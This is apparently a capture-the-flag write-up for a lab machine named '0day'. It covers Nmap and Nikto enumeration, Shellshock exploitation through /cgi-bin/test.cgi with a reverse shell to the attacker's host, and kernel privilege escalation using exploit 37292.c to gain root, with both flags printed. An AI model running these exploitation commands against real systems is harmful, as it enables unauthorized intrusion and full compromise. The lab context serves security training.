# IP
10.10.200.200

## Enumeration

### Nmap
- Found 2 ports running on the machine

```console
❯ nmap -sC -sV 10.10.200.200 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-05 17:57 IST
Nmap scan report for 10.10.200.200
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.45 seconds

```

### Nikto (found it today)

- Found this bit interesting

```console
❯ nikto -host http://10.10.200.200  | tee nikto.log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.200.200
+ Target Hostname:    10.10.200.200
+ Target Port:        80
+ Start Time:         2022-11-05 17:59:28 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
```

```console
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
```
- Found an [exploit](https://www.exploit-db.com/exploits/34900)

## Exploitation([CVE-2014-6278](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278))

```console
❯ python2 exploit.py


		Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
```

- Started exploit 

```console
❯ python2 exploit.py  payload=reverse rhost=10.10.200.200 lhost=10.17.0.215 lport=4444
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-sys/entropysearch.cgi
[*] 404 on : /cgi-sys/entropysearch.cgi
[-] Trying exploit on : /cgi-sys/defaultwebpage.cgi
[*] 404 on : /cgi-sys/defaultwebpage.cgi
[-] Trying exploit on : /cgi-mod/index.cgi
[*] 404 on : /cgi-mod/index.cgi
[-] Trying exploit on : /cgi-bin/test.cgi
[!] Successfully exploited
[!] Incoming connection from 10.10.200.200
10.10.200.200> whoami
www-data

10.10.200.200>

```

- Found user flag

```console
10.10.200.200> cd /home
10.10.200.200> ls
ryan

10.10.200.200> cd ryan
10.10.200.200> ls
user.txt

10.10.200.200> cat user.txt
THM{Sh3llSh0ck_r0ckz}
```

## Privilege Escalation

- On searching for os name and linux kernal to be vulnerable


```console
10.10.200.200> uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

10.10.200.200> cat /proc/version
Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014
```

- Found an exploit

```console
❯ searchsploit ubuntu 3.13.0-32
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14 | linux/local/37293.txt
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64 | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFI | linux/local/31346.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP So | linux/dos/43234.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)  | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'net | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.0 | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Vi | linux/local/41760.txt
-------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- Checked whether gcc is present on the machine

```console
10.10.200.200> gcc -v
Using built-in specs.
```

- Started exploit and found an error

```console
10.10.200.200> gcc 37292.c
37292.c

10.10.200.200> ls
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

- On searching found that cc1 was installed but was not on path so added it to path

```console
10.10.200.200> whereis cc1
37292.c

10.10.200.200>
cc1:
10.10.200.200> 10.10.200.200> echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
10.10.200.200> export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
10.10.200.200> echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

- Started the exploit but shell doesn't look nice, but it works.

```console
10.10.200.200> ls
37292.c
exploit

10.10.200.200> ./exploit
spawning threads

10.10.200.200>
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
#
10.10.200.200> whoami
root
#

```

Found root flag

```console
10.10.200.200>
#
10.10.200.200> cd /root
#
10.10.200.200> ls
#
10.10.200.200> ls
root.txt
#
10.10.200.200> cat root.txt
root.txt
#
10.10.200.200>
THM{g00d_j0b_0day_is_Pleased}
#
10.10.200.200>


```
- 

